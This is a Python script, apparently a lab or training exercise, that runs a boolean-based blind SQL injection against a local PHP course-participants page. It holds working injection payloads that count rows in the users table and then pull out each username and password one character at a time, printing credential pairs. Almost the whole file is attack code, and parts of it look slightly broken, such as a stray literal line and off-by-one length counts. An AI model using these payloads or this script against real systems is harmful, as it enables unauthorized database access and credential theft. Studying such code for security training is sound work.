

#!/usr/bin/python3
import requests, string
from bs4 import BeautifulSoup

initurl = "http://localhost:30000/participants.php?courseid=5"

phpsessid_cookie = "l4pcbachui4b150qmh8nobbjgd"
headers = {'Cookie': f'PHPSESSID={phpsessid_cookie}'}
usernamechars = list(string.ascii_lowercase + string.ascii_uppercase)
passwordchars = list(string.ascii_lowercase + string.ascii_uppercase + string.digits + "_"+"!")

# Request data and check if it contains "student count" details in it.
# If the count is 0, then the SQL-Injection result was False, and if it was != 0 then the SQL-Injection result was True
def requestData(sqlQuery, log=False):
    try:
        url = initurl + sqlQuery
        # Send a GET request to the URL
        response = requests.get(url, headers=headers)
        # Check if the request was successful (status code 200)
        if response.status_code == 200:
            # Parse the HTML content of the page
            soup = BeautifulSoup(response.text, 'html.parser')

            # Extract specific nodes or elements from the parsed HTML
            # For example, let's extract all the links (anchor tags)
            paras = soup.find('p', class_="count")
            # print(soup)

            count = paras.text.split(":")[-1].strip()
            if int(count) != 0:
               return True
        else:
            if (log):
                print(f'Error: Failed to fetch the page (Status Code: {response.status_code})')

    except requests.exceptions.RequestException as e:
        print(f'Error: {e}')
    return False

# It should count number of rows in "users" table
def countTableRows(log=False):
    datacount = 0
    if (log):
        print("[+] Counting number of rows in users table...")
    for i in range(20):

        # --------------------------------------- UPDATE PAYLOAD HERE ------------------------------- #
        4
        sqlcountrows = "' and "+str(i)+"=(select count(*) from users); -- abc"
        # ---------------------------------------------------------------------- #

        if requestData(sqlcountrows):
            if (log):
                print("\t[*] Number of rows in users table: ", i, sep="")
            datacount = i
            break
    return datacount

# It should count number of characters for a username in "users" table given the offset.
# "userOffset" should be defined as the number of row
def getUsernameCharacterCount(userOffset, log=False):
    if (log):
        print(f"[+] Counting number of characters in {userOffset}th username...")
    usernamecharCount = 0
    for count in range(20):
# ' and 4=(select LENGTH(username) from users limit 1 offset 3); -- abc
        # --------------------------------------- UPDATE PAYLOAD HERE ------------------------------- #
        usernamecharscountquery ="' and {}=(select LENGTH(username) from users limit 1 offset {}); -- abc".format(count,userOffset)
        # ---------------------------------------------------------------------- #

        if requestData(usernamecharscountquery):
            if (log):
                print(f"\t[*] Number of characters in {userOffset}th username: ", count, sep="")
            usernamecharCount = count
            break
    print("username char count: ",usernamecharCount)
    return usernamecharCount+1

# It should return a username in "users" table given the offset and username character count.
# "userOffset" should be defined as the number of row
def findCurrentUsername(userOffset, usernamecharCount, log=False):
    username = ""
    if (log):
        print(f"[+] Finding {userOffset}th username...")
    for count in range(usernamecharCount):
        for ch in usernamechars:

            # --------------------------------------- UPDATE PAYLOAD HERE ------------------------------- #
            sqlusernameenum = "' and '{}'=(select substring(username,{},1) from users LIMIT 1 OFFSET {}); -- abc".format(ch,count,userOffset)
#             print(sqlusernameenum);
            # ---------------------------------------------------------------------- #

            if requestData(sqlusernameenum):
                username+=ch
                break
    if(log):
        print(f"\t[+] Found {userOffset}th username: {username}")
    return username

# It should count number of characters in the password of a username in "users" table given the username.
def getPasswordCharacterCount(username, log=False):
    passwordcharcount = 0
    if (log):
        print(f"[+] Counting number of characters in the password of {username}...")
    for count in range(50):

        # --------------------------------------- UPDATE PAYLOAD HERE ------------------------------- #
        passwordcharscountquery = "' and {}=(select LENGTH(password) from users where username='{}'); -- abc".format(count,username);
#         print(passwordcharscountquery)
        # ---------------------------------------------------------------------- #

        if requestData(passwordcharscountquery,True):
            if (log):
                print(f"\t[*] Number of characters in the password of {username}: ", count, sep="")
            passwordcharcount = count
            break
    return passwordcharcount +1

# It should return the password of a username in "users" table given the username and password character count.
def findCurrentPassword(passwordcharcount, username, log=False):
    password = ""
    if (log):
        print(f"[+] Finding password of user: {username}...")
    for count in range(passwordcharcount):
        for ch in passwordchars:
            # --------------------------------------- UPDATE PAYLOAD HERE ------------------------------- #
            sqlpasswordenum = "' and '{}'=(select substring(password,{},1) from users where username='{}'); -- abc".format(ch,count,username);
            # ---------------------------------------------------------------------- #
            if requestData(sqlpasswordenum):
                password+=ch
                break
    if (log):
        print(f"\t[+] Password found as: {password}")
    return password

# print(countTableRows())
tbl_rows=countTableRows(True)

for i in range(tbl_rows):
    username = findCurrentUsername(i, getUsernameCharacterCount(i,True),True)
    password = findCurrentPassword(getPasswordCharacterCount(username,True), username,True)
    print(f"[+] Username:Password found: ", end="")
    print(f"{username}:{password}")